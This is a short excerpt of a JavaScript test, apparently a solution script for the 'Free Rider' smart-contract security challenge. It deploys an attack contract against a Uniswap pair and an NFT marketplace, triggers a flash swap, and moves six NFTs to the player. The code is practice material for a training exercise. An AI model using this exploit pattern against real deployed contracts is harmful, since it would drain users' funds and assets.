...
describe('[Challenge] Free Rider', function () {
  ...
  it('Execution', async function () {
    ...
    const FreeRiderAttack = await ethers.getContractFactory('FreeRiderAttack')
    const freeRiderAttack = await FreeRiderAttack.deploy(
      uniswapPair.address,
      weth.address,
      marketplace.address,
    ...
    await freeRiderAttack.flashSwap()

    for (i = 0; i < 6; i++) {
      await freeRiderAttack.connect(player).transferNft(i)
    }
  })
